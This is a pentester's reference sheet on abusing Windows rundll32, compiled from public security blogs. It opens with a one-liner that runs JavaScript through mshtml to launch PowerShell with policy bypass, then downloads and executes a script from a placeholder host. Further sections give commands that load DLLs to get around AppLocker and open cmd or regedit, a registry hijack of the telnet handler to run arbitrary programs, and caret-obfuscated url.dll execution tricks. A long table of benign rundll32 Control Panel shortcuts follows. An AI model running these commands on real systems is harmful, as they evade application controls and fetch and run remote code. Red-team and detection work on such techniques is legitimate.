# Applocker Bypass
https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/

The following command needs to be executed from the command prompt. If the command prompt is locked then the method that is described below can be used to unlock the cmd.
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
```

The utility rundll32 can then load and execute the payload that is inside the pentestlab.dll.
```
rundll32 shell32.dll,Control_RunDLL C:\Users\pentestlab.dll
```
## Open Command Prompt
Since the rundll32 is a trusted Microsoft utility it can be used to load the cmd.dll into a process, execute the code on the DLL and therefore bypass the AppLocker rule and open the command prompt. The following two commands can be executed from the Windows Run:
```
rundll32 C:\cmd.dll,EntryPoint
```
OR
```
rundll32 shell32.dll,Control_RunDLL C:\cmd.dll
```
## Open Registry Editor


The following commands can load and run the regedit.dll via rundll32 and therefore bypass the AppLocker rule.
```
rundll32 C:\regedit.dll,EntryPoint
```
OR
```
rundll32 shell32.dll,Control_RunDLL C:\regedit.dll
```


# PASS-THRU COMMAND EXECUTION WITH ‘TelnetProtocolHandler’
https://twitter.com/nas_bench/status/1432781693279248390

1. create "telnet.exe" key in the "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths" registry
2. Set the "Default" key to any executable you want to run. 
3. Call it in CMD by running:
```
rundll32.exe url.dll,TelnetProtocolHandler
```

# PASS-THRU COMMAND EXECUTION WITH ‘OPENURL’
https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
### URL FILE EXAMPLE (‘CALC.URL’)
```
[InternetShortcut]
URL=file:///c:\windows\system32\calc.exe
```
### COMMAND EXAMPLES
```
rundll32.exe ieframe.dll, OpenURL <path to local URL file>
rundll32.exe url.dll, OpenURL <path to local URL file>
rundll32.exe shdocvw.dll, OpenURL <path to local URL file>
```
```
rundll32.exe url.dll,OpenURL "C:\test\calc.hta"	 
rundll32.exe url.dll,OpenURL "C:\test\calc.url"	 
rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e	 
```
# PASS-THRU COMMAND EXECUTION WITH ‘FileProtocolHandler’
https://strontic.github.io/xcyclopedia/library/url.dll-3B193173A517524600C63D60FE3C0771.html
```
rundll32.exe url.dll,FileProtocolHandler calc.exe	 
rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e	 
rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
```

DLL Exports:
1. TelnetProtocolHandler	
2. TelnetProtocolHandlerA	
3. OpenURL	
4. OpenURLA
5. URLAssociationDialogA
6. URLAssociationDialogW
7. TranslateURLA
8. TranslateURLW
9. MIMEAssociationDialogW
10. FileProtocolHandler
11. FileProtocolHandlerA
12. AddMIMEFileTypesPS
13. AutodialHookCallback
14. MailToProtocolHandlerA
15. MIMEAssociationDialogA
16. InetIsOffline	
17. MailToProtocolHandler














| Function	| Rundll32 command |
|-----------|------------------|
| About Windows | Rundll32.exe shell32.dll,ShellAbout | 
| Add Network Location Wizard | Rundll32 %SystemRoot%\system32\shwebsvc.dll,AddNetPlaceRunDll | 
| Add Printer Wizard | Rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL AddPrinter | 
| Add Standard TCP/IP Printer Port Wizard | Rundll32.exe tcpmonui.dll,LocalAddPortUI | 
| Control Panel | Rundll32.exe shell32.dll,Control_RunDLL | 
| Date and Time | Rundll32.exe shell32.dll,Control_RunDLL timedate.cpl | 
| Date and Time - Additional Clocks tab | Rundll32.exe shell32.dll,Control_RunDLL timedate.cpl,,1 | 
| Desktop Icon Settings | Rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0 | 
| Device Installation Settings | Rundll32.exe %SystemRoot%\System32\newdev.dll,DeviceInternetSettingUi | 
| Device Manager | Rundll32.exe devmgr.dll DeviceManager_Execute | 
| Display Settings | Rundll32.exe shell32.dll,Control_RunDLL desk.cpl | 
| Ease of Access Center | Rundll32.exe shell32.dll,Control_RunDLL access.cpl | 
| Environment Variables | Rundll32.exe sysdm.cpl,EditEnvironmentVariables | 
| File Explorer Options - General tab | Rundll32.exe shell32.dll,Options_RunDLL 0 | 
| File Explorer Options - Search tab | Rundll32.exe shell32.dll,Options_RunDLL 2 | 
| File Explorer Options - View tab | Rundll32.exe shell32.dll,Options_RunDLL 7 | 
| Fonts folder | Rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL FontsFolder | 
| Forgotten Password Wizard | Rundll32.exe keymgr.dll,PRShowSaveWizardExW | 
| Game Controllers | Rundll32.exe shell32.dll,Control_RunDLL joy.cpl | 
| Hibernate or Sleep | Rundll32.exe powrprof.dll,SetSuspendState | 
| Indexing Options | Rundll32.exe shell32.dll,Control_RunDLL srchadmin.dll | 
| Infared | Rundll32.exe shell32.dll,Control_RunDLL irprops.cpl | 
| Internet Explorer - delete all browsing history | Rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 255 | 
| Internet Explorer - delete all browsing history and add-ons history | Rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 4351 | 
| Internet Explorer - delete cookies and website data | Rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 2 | 
| Internet Explorer - delete download history | Rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 16384 | 
| Internet Explorer - delete form data | Rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 16 | 
| Internet Explorer - delete history | Rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 1 | 
| Internet Explorer - delete passwords | Rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 32 | 
| Internet Explorer - delete temporary Internet files and website files | Rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 8 | 
| Internet Explorer - Organize Favorites | Rundll32.exe shdocvw.dll,DoOrganizeFavDlg | 
| Internet Properties - General tab | Rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl | 
| Internet Properties - Security tab | Rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,1 | 
| Internet Properties - Privacy tab | Rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,2 | 
| Internet Properties - Content tab | Rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,3 | 
| Internet Properties - Connections tab | Rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,4 | 
| Internet Properties - Programs tab	 | Rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,5 | 
| Internet Properties - Advanced tab	 | Rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,6 | 
| Keyboard Properties | Rundll32.exe shell32.dll,Control_RunDLL main.cpl @1 | 
| Lock PC | Rundll32.exe user32.dll,LockWorkStation | 
| Map Network Drive wizard | Rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL Connect | 
| Mouse Button swap left and right button function | Rundll32.exe user32.dll,SwapMouseButton | 
| Mouse Properties - Buttons tab | Rundll32.exe shell32.dll,Control_RunDLL main.cpl | 
| Mouse Properties - Pointers tab | Rundll32.exe shell32.dll,Control_RunDLL main.cpl,,1 | 
| Mouse Properties - Pointer Options tab | Rundll32.exe shell32.dll,Control_RunDLL main.cpl,,2 | 
| Mouse Properties - Wheel tab | Rundll32.exe shell32.dll,Control_RunDLL main.cpl,,3 | 
| Mouse Properties - Hardware tab | Rundll32.exe shell32.dll,Control_RunDLL main.cpl,,4 | 
| Network Connections | Rundll32.exe shell32.dll,Control_RunDLL ncpa.cpl | 
| ODBC Data Source Administrator | Rundll32.exe shell32.dll,Control_RunDLL odbccp32.cpl | 
| Offline Files (General tab) | Rundll32.exe Shell32.dll,Control_RunDLL cscui.dll,,0 | 
| Offline Files (Disk Usage tab) | Rundll32.exe Shell32.dll,Control_RunDLL cscui.dll,,1 | 
| Offline Files (Encryption tab) | Rundll32.exe Shell32.dll,Control_RunDLL cscui.dll,,2 | 
| Offline Files (Network tab) | Rundll32.exe Shell32.dll,Control_RunDLL cscui.dll,,3 | 
| Pen and Touch | Rundll32.exe shell32.dll,Control_RunDLL tabletpc.cpl | 
| Personalization - Background Settings | Rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,2 | 
| Power Options | Rundll32.exe shell32.dll,Control_RunDLL powercfg.cpl | 
| Printer User Interface | Rundll32.exe Printui.dll,PrintUIEntry /? | 
| Printers folder | Rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL PrintersFolder | 
| Process idle tasks | Rundll32.exe advapi32.dll,ProcessIdleTasks | 
| Programs and Features | Rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl,,0 | 
| Region - Formats tab | Rundll32.exe shell32.dll,Control_RunDLL Intl.cpl,,0 | 
| Region - Location tab | Rundll32.exe shell32.dll,Control_RunDLL Intl.cpl,,1 | 
| Region - Administrative tab | Rundll32.exe shell32.dll,Control_RunDLL Intl.cpl,,2 | 
| Safely Remove Hardware | 	Rundll32.exe shell32.dll,Control_RunDLL HotPlug.dll | 
| Screen Saver Settings | Rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,1 | 
| Security and Maintenance | Rundll32.exe shell32.dll,Control_RunDLL wscui.cpl | 
| Set Program Access and Computer Defaults | Rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl,,3 | 
| Set Up a Network wizard | Rundll32.exe shell32.dll,Control_RunDLL NetSetup.cpl | 
| Sleep or Hibernate | Rundll32.exe powrprof.dll,SetSuspendState | 
| Sound - Playback tab | Rundll32.exe shell32.dll,Control_RunDLL Mmsys.cpl,,0 | 
| Sound - Recording tab | Rundll32.exe shell32.dll,Control_RunDLL Mmsys.cpl,,1 | 
| Sound - Sounds tab | Rundll32.exe shell32.dll,Control_RunDLL Mmsys.cpl,,2 | 
| Sound - Communications tab | Rundll32.exe shell32.dll,Control_RunDLL Mmsys.cpl,,3 | 
| Speech Properties - Text to Speech tab | Rundll32.exe shell32.dll,Control_RunDLL %SystemRoot%\System32\Speech\SpeechUX\sapi.cpl,,1 | 
| Start Settings | Rundll32.exe shell32.dll,Options_RunDLL 3 | 
| Stored User Names and Passwords | Rundll32.exe keymgr.dll,KRShowKeyMgr | 
| System Properties - Computer Name tab | Rundll32.exe shell32.dll,Control_RunDLL Sysdm.cpl,,1 | 
| System Properties - Hardware tab | Rundll32.exe shell32.dll,Control_RunDLL Sysdm.cpl,,2 | 
| System Properties - Advanced tab | Rundll32.exe shell32.dll,Control_RunDLL Sysdm.cpl,,3 | 
| System Properties - System Protection tab | Rundll32.exe shell32.dll,Control_RunDLL Sysdm.cpl,,4 | 
| System Properties - Remote tab | Rundll32.exe shell32.dll,Control_RunDLL Sysdm.cpl,,5 | 
| Taskbar Settings | Rundll32.exe shell32.dll,Options_RunDLL 1 | 
| Text Services and Input Languages | Rundll32.exe Shell32.dll,Control_RunDLL input.dll,,{C07337D3-DB2C-4D0B-9A93-B722A6C106E2} | 
| User Accounts | Rundll32.exe shell32.dll,Control_RunDLL nusrmgr.cpl | 
| Windows Features | Rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl,,2 | 
| Windows Firewall | Rundll32.exe shell32.dll,Control_RunDLL firewall.cpl | 
| Windows To Go Startup Options | Rundll32.exe pwlauncher.dll,ShowPortableWorkspaceLauncherConfigurationUX | 






















# Extra References
1. https://strontic.github.io/xcyclopedia/
2. https://lolbas-project.github.io/
3. 
